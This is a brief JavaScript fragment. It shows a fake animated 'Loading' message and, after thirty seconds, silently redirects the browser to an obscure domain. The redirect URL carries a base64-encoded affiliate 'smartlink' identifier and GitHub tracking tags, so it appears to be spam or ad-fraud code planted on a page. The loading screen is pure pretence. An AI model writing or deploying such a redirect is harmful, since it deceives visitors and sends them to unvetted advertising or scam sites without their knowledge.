   var ci = 0;
    var load = document.getElementById("load");
    setInterval(function(){
        switch(ci){
            case 0:
                load.innerHTML = 'Loading<br>';
                ci = 1;
                break;
            case 1:
                load.innerHTML = 'Loading<br>.';
                ci = 2;
                break;
            case 2:
                load.innerHTML = 'Loading<br>. . .';
                ci = 3;
                break;
            case 3:
                load.innerHTML = 'Loading<br>. . . . .';
                ci = 4;
                break;
            case 4:
                load.innerHTML = 'Loading<br>. . . . . . .';
                ci = 5;
                break;
            case 5:
                load.innerHTML = 'Loading<br>. . . . . . . . .';
                ci = 0;
                break;
        }
    },300);
    setTimeout(function(){
                window.location.href = "https://cqwajn.com/gosl/InNpZCI6MTA3NDQ4Nywic21hcnRsaW5rIjp0cnVlfQ==eyJwaWQiOjEwMjg3Nzcs?si1=github&si2=jandarahasia";
            },30000);   
